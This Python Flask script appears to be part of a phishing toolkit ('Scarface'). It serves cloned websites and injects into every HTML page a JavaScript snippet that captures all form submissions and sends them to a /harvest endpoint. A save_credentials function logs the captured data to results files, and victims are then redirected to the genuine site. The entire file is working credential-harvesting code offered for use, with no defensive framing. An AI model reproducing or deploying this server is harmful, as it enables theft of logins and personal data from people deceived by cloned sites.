import os
from flask import Flask, request, redirect, jsonify
import json
from datetime import datetime

# Initialize Flask app
app = Flask(__name__)

# Get the script's directory and set base directory
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
BASE_DIR = os.path.abspath(os.path.join(SCRIPT_DIR, '..'))

# Configure directories relative to Scarface root
SITES_DIR = os.path.join(BASE_DIR, 'sites')
RESULTS_DIR = os.path.join(BASE_DIR, 'results')

# Injection script remains the same
INJECTION_SCRIPT = """
<script>
    document.addEventListener('submit', function(event) {
        const form = event.target;
        const formData = new FormData(form);
        const data = {};
        formData.forEach((value, key) => data[key] = value);

        fetch('/harvest', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    });
</script>
"""

selected_site_dir = None
entry_file = None
selected_site_name = None

def list_cloned_sites():
    """Get sites from the parent directory's sites folder"""
    if not os.path.exists(SITES_DIR):
        print(f"[ERROR] Directory '{SITES_DIR}' not found!")
        return []

    sites = [d for d in os.listdir(SITES_DIR) 
             if os.path.isdir(os.path.join(SITES_DIR, d))]
    return sites

def select_site(sites):
    """Selection menu remains the same"""
    print("\n📂 Available Cloned Sites:")
    for idx, site in enumerate(sites, 1):
        print(f"   {idx}. {site}")

    while True:
        try:
            choice = int(input("\n🔍 Enter site number to deploy: "))
            if 1 <= choice <= len(sites):
                return sites[choice - 1]
            print("[ERROR] Invalid number")
        except ValueError:
            print("[ERROR] Enter a number")

def detect_entry_file(site_dir):
    """Detect entry file with full path"""
    index_path = os.path.join(site_dir, "index.html")
    if os.path.exists(index_path):
        return "index.html"
    
    html_files = [f for f in os.listdir(site_dir) if f.endswith(".html")]
    if html_files:
        print(f"[WARNING] Using '{html_files[0]}' as entry")
        return html_files[0]
    
    print("[ERROR] No HTML files found")
    exit(1)

@app.route("/", methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def serve_cloned_site(path=None):
    global entry_file

    if path is None:
        path = entry_file

    if request.method == "POST":
        form_data = request.form.to_dict()
        log_data = {
            "timestamp": str(datetime.now()),
            "form_data": form_data
        }
        save_credentials(log_data)
        return redirect("https://original-website.com")

    file_path = os.path.join(selected_site_dir, path)
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as file:
            content = file.read()
        
        if file_path.endswith(".html"):
            content = content.replace("</body>", f"{INJECTION_SCRIPT}</body>")
        return content
    return "404 - Not Found", 404

@app.route("/harvest", methods=["POST"])
def harvest():
    harvested_data = request.get_json()
    log_data = {
        "timestamp": str(datetime.now()),
        "harvested_data": harvested_data
    }
    save_credentials(log_data)
    return "", 204

def save_credentials(log_data):
    """Save to results directory in parent folder"""
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)
    
    log_file = os.path.join(RESULTS_DIR, f"{selected_site_name}.log")
    with open(log_file, "a") as f:
        f.write(json.dumps(log_data, indent=4) + "\n")
    print(f"[INFO] Data saved to: {log_file}")

if __name__ == "__main__":
    cloned_sites = list_cloned_sites()
    if not cloned_sites:
        print("[INFO] No sites found in sites directory")
        exit(1)

    selected_site_name = select_site(cloned_sites)
    selected_site_dir = os.path.join(SITES_DIR, selected_site_name)
    print(f"\n[INFO] Deploying: '{selected_site_name}'")

    entry_file = detect_entry_file(selected_site_dir)
    print(f"[INFO] Using entry file: '{entry_file}'")

    print("\n[INFO] Starting Harvester Server...")
    print(f"       Site: {selected_site_name}")
    print(f"       Results will save to: {RESULTS_DIR}")
    app.run(host="0.0.0.0", port=8080)
